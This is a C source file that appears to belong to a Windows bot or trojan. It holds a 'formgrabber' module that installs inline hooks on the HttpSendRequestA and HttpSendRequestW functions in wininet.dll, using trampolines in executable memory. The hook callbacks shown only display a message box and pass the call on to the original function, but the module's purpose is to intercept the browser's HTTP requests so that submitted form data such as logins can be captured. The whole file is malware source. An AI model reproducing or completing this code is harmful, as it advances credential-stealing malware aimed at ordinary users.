#include "wininet.h"
#ifdef MODULE_FORMGRABBER
#include "formgrabber.h"
#include "hook.h"
#include <WinInet.h>

ptHttpSendRequestA oHttpSendRequestA;
ptHttpSendRequestW oHttpSendRequestW;

extern bot_t bot;

BOOL WINAPI HttpSendRequestW_Hooked(HINTERNET hRequest,
	__in_ecount_opt(dwHeadersLength) LPCWSTR lpszHeaders,
	__in DWORD dwHeadersLength,
	__in_bcount_opt(dwOptionalLength) LPVOID lpOptional,
	__in DWORD dwOptionalLength)
{
	MessageBox(0, "HttpSendRequestW", 0, 0);
	return oHttpSendRequestW(hRequest, lpszHeaders, dwHeadersLength, lpOptional, dwOptionalLength);
}

BOOL WINAPI HttpSendRequestA_Hooked(_In_ HINTERNET hRequest,
	_In_reads_opt_(dwHeadersLength) LPCSTR lpszHeaders,
	_In_ DWORD dwHeadersLength,
	_In_reads_bytes_opt_(dwOptionalLength) LPVOID lpOptional,
	_In_ DWORD dwOptionalLength)
{
	MessageBox(0, "HttpSendRequestA", 0, 0);
	return oHttpSendRequestA(hRequest, lpszHeaders, dwHeadersLength, lpOptional, dwOptionalLength);
}

BOOL WINAPI IsWininet(HMODULE* phMod)
{
	HMODULE hMod;

	if ((hMod = bot.api.pGetModuleHandleW(L"wininet.dll")) != 0)
	{
		*phMod = hMod;

		return TRUE;
	}

	return FALSE;
}

BOOL WINAPI InstallWininetHooks(void)
{
	HMODULE hMod;
	unsigned int i;
	LPVOID lpFunctionAddress;
	DWORD dwLength;

	if (!IsWininet(&hMod))
		return FALSE;

	formgrabber_hook_t hooks[] =
	{
		{"HttpSendRequestA", &HttpSendRequestA_Hooked, (LPVOID*)&oHttpSendRequestA},
		{"HttpSendRequestW", &HttpSendRequestW_Hooked, (LPVOID*)&oHttpSendRequestW}
	};

	for (i = 0; i < sizeof(hooks) / sizeof(formgrabber_hook_t); i++)
	{
		if ((lpFunctionAddress = GetProcAddress(hMod, hooks[i].pszFunctionName)) != 0)
		{
			*hooks[i].lppOriginal = bot.api.pVirtualAlloc(0, 25, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

			if (!HookFunction(lpFunctionAddress, hooks[i].lpCallback, *hooks[i].lppOriginal, &dwLength))
				return FALSE;
		}
	}

	return TRUE;
}
#endif